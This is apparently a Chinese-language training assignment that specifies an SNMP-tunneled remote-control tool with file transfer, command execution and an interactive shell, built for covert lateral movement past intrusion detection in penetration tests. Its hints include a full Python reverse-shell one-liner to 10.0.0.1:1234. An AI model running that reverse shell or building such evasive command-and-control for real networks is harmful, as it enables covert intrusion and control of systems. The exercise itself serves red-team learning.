# Super Naive Management Protocal

## Background

SNMP是一种用于监控和管理网络设备的协议。企业数据中心通常有大量服务器/网络设备需要运维管理，例如统计运行状态，资源占用等等。

在对内网的渗透测试时。内网间的横向移动，包括扫描，爆破，转发，比较容易触发安全设备（IPS/IDS）等等。

通常来说，内网中会有较多的IGMP/SNMP等等流量，一些比较捉鸡的安全设备可能会直接放行。

## Details

你需要实现一个基于SNMP协议的远程控制工具，包括客户端和服务端

客户端和服务端工作在**Linux**操作系统上

客户端连接服务端后，用户可以通过操作服务端完成以下功能

* 文件上传/下载
* 命令执行（并获取输出结果）
* 伪终端（可以交互）

服务端实现以下功能

* 管理多个客户端

## Attention

1. 使用你喜欢的语言
2. 不允许使用已有的可靠连接库（QUIC/KCP）
3. 文件传输性能不做要求，命令执行回显性能不做要求
4. 发出的流量**必须**是正常的SNMP流量。比如，使用tcpdump抓包显示结果是SNMP
5. **SNMP工作在UDP上，要考虑丢包问题**

## Hint

* 客户端可以向服务端轮询任务，任务告知客户端要做的事，和下一次与服务端数据交换的间隔
* 通俗一点的话。客户端："我上次干了啥，这次要干啥。干完啥时候给你"
* 校验。数据有损坏的话重传
* 交互式shell的话，可以研究以下这一行代码`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

## Advanced(Optional)

* 实现数据加密
* 优化速度
* 友好的用户界面
* 视频传输

## References

[SNMP - Wikipedia](https://en.wikipedia.org/wiki/Simple_Network_Management_Protocol)

[CobaltStrike](https://www.cobaltstrike.com/)

[Meterpreter](https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/)